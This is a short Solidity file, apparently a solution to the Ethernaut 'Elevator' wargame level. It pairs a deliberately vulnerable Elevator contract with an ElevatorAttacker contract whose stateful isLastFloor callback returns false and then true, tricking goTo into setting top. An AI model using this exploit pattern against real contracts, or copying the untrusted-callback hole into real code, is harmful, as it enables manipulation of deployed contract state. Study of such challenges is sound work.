// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract ElevatorAttacker is Building {

    Elevator elav;
    uint counter;

    constructor(address _elavator) public {
        elav = Elevator(_elavator);
        counter = 0;
    }

    function isLastFloor(uint _floor) external override returns (bool) {
        if(counter != 0) {
            return true;
        }
        else {
            counter = counter + 1;
            return false;
        }
    }

    function attackLift(uint _num) public {
        elav.goTo(_num);
    }


}